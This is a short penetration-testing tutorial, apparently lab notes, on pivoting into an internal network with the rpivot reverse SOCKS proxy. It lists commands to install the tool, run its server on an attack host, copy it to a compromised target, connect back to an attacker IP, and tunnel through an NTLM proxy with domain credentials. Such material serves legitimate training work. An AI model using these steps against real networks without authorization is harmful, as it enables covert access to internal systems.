
[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

```shell-session
git clone https://github.com/klsecservices/rpivot.git
```

```shell-session
sudo apt-get install python2.7
```
#### Alternative Installation of Python2.7

  Web Server Pivoting with Rpivot

```shell-session
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```


#### Running server.py from the Attack Host
```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#### Transfering rpivot to the Target

```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
#### Running client.py from Pivot Target

```shell-session
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
